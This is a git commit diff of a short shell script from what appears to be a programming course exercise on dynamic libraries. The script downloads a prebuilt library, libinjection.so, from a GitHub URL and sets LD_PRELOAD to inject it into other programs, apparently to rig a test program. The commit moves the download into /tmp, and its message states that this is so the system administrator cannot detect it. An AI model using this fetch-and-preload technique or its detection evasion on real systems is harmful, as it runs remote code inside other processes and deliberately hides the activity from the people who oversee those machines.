fc3af8d19251ad3b6c03228eee6dbf9a2da368de
BennettDixon <bennettdixon16@gmail.com>
2018-12-12 01:54:32 +0000

    changed to download in tmp directory to sysadmin can't detect

--- 0x17-dynamic_libraries/101-make_me_win.sh
+++ 0x17-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O ~/libinjection.so https://github.com/BennettDixon/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/libinjection.so
-export LD_PRELOAD=~/libinjection.so
+wget -O /tmp/libinjection.so https://github.com/BennettDixon/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/libinjection.so
+export LD_PRELOAD=/tmp/libinjection.so
